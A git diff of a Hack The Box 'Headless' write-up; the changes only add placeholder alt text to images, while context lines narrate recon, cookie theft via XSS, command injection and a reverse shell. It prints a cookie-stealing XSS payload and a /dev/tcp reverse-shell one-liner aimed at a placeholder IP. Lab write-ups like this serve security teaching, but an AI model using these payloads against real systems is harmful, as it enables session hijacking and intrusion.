@@ -7,7 +7,8 @@ tags: [machine, xss, cookie stealing]
 
 <p>
     <a href="https://app.hackthebox.com/machines/594">
-        <img src="assets/img/headless/Headless.png" width="500">
+        <img src="assets/img/headless/Headless.png" width="500"
+        alt="Descripción">
     </a>
 </p>
 
@@ -122,13 +123,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 There is an active service on port 5000 ! 
 
 <p>
-  <img src="assets/img/headless/home.png" />
+  <img src="assets/img/headless/home.png" 
+  alt="Descripción"/>
 </p>
 
 Clicking "For questions" redirects us to the **/support** page.
 
 <p>
-  <img src="assets/img/headless/support.png" />
+  <img src="assets/img/headless/support.png" 
+  alt="Descripción"/>
 </p>
 
 To understand if other endpoints exist, I start *gobuster*, finding another endpoint.
@@ -156,7 +159,8 @@ Starting gobuster in directory enumeration mode
 By visiting the **/dashboard** endpoint we see that we are not authorized to view that page.
 
 <p>
-  <img src="assets/img/headless/dashboard_not.png" />
+  <img src="assets/img/headless/dashboard_not.png" 
+  alt="Descripción"/>
 </p>
 
 ## 3. XSS
@@ -170,13 +174,15 @@ The fact that it is present:
 It makes me think about the possible presence of an XSS that I need to steal the admin cookie. Then I intercept the request made by the *support* page and insert the following payload in the message field: `<img src=q onerror=fetch('http://IP:1234/'+document.cookie);>`
 
 <p>
-  <img src="assets/img/headless/hacking.png" />
+  <img src="assets/img/headless/hacking.png" 
+  alt="Descripción"/>
 </p>
 
 But the server recognizes the hacking attempt. So I tried to receive the cookie by placing the payload in the *User-Agent* field.
 
 <p>
-  <img src="assets/img/headless/cookie.png" />
+  <img src="assets/img/headless/cookie.png" 
+  alt="Descripción"/>
 </p>
 
 ## 4. RCE
@@ -184,25 +190,29 @@ But the server recognizes the hacking attempt. So I tried to receive the cookie 
 The XSS was successful so we can set the cookie and see the contents of the *dashboard*.
 
 <p>
-  <img src="assets/img/headless/dashboard.png" />
+  <img src="assets/img/headless/dashboard.png" 
+  alt="Descripción"/>
 </p>
 
 By clicking "Generate Report" we see the message that the server returns.
 
 <p>
-  <img src="assets/img/headless/after_click.png" />
+  <img src="assets/img/headless/after_click.png" 
+  alt="Descripción"/>
 </p>
 
 This makes us think of a possible RCE (which is however very frequent in easy machines); then we intercept the request and add a ";" followed by a command after the *date* parameter.
 
 <p>
-  <img src="assets/img/headless/poc_RCE.png" />
+  <img src="assets/img/headless/poc_RCE.png" 
+  alt="Descripción"/>
 </p>
 
 We get the result of the `pwd` command so we proceed with a reverse shell. I started by directly entering the command `/bin/bash -i >& /dev/tcp/IP/1337 0>&1` with no results, so I proceeded by placing the command in a file and loaded and ran it via curl in pipe with bash and I had the shell.
 
 <p>
-  <img src="assets/img/headless/reverse_shell.png" />
+  <img src="assets/img/headless/reverse_shell.png" 
+  alt="Descripción"/>
 </p>
 
 In */home/dvir* there is the user flag.
